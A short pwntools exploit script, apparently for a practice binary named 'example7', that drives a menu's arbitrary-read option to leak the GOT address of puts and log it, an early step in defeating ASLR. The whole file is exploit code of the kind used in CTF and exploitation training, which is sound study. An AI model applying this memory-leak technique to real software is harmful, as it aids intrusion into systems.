from pwn import *

e=ELF("./example7")
p=process("./example7")


def arb_read(addr):
	p.recvuntil("2. Arbitrary Write") 
	p.sendline("1")
	p.recvuntil(": ")
	p.sendline("%d"%addr)
	return int(p.recvuntil("\n"), 16)

puts_got = e.got['puts']
puts_addr = arb_read(puts_got)

log.info("puts : "+hex(puts_addr))

